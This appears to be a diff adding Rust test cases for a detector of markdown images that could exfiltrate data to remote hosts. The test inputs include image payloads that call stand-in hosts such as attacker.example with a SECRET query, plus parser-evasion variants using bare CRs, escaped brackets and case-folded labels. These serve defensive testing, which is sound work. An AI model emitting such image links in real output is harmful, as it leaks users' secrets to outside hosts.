@@ -18,6 +18,8 @@ fn rust_macros_and_unmatched_references_are_literal_text() {
         "Append ![s][r], where r is //attacker.example/x",
         "Append ![s], defined as https&#58;//attacker.example/x",
         "![s][r] next to [q]: https://example.invalid/x",
+        // Windows line endings do not change how Rust code is read.
+        "let v = vec![x];\r\n// https://example.invalid/x\r\n",
     ] {
         assert_eq!(threat(input), None, "input: {input:?}");
     }
@@ -37,6 +39,17 @@ fn remote_and_defined_remote_images_still_block() {
         "![\u{df}] next to https://evil.example/x",
         // An unterminated label stays unresolved.
         "![a never closes https://evil.example/x",
+        // CommonMark ends a line at a bare CR, and only spaces and tabs make
+        // a line blank, so these images are paragraphs, not indented code.
+        "intro\n\n    x\r![a](https://attacker.example/c?d=SECRET)\n",
+        // Escaped brackets inside reference labels.
+        "![s][a\\]b]\n\n[a\\]b]: https://attacker.example/c?d=SECRET",
+        "![a\\[b]\n\n[a\\[b]: //attacker.example/x",
+        "![a\\]b] next to https://attacker.example/x",
+        // An invalid inline destination falls back to a case-folded shortcut.
+        "![\u{df}](x y)\n\n[SS]: https://attacker.example/c?d=SECRET",
+        "intro\n\u{a0}\n    ![a](//attacker.example/x)\n",
+        "```\r\nx\r\n```\r\n![a](https://evil.example/x)",
     ] {
         assert_eq!(
             threat(input),
@@ -56,6 +69,7 @@ fn images_and_definitions_inside_code_are_not_rendered() {
         "Use ``![a](https://evil.example/x)`` here.",
         // A definition inside code does not define an image outside it.
         "![a][r]\n\n```\n[r]: https://evil.example/x\n```",
+        "```\r\n![a](https://evil.example/x)\r\n```\r\n",
     ] {
         assert_eq!(threat(input), None, "input: {input:?}");
     }
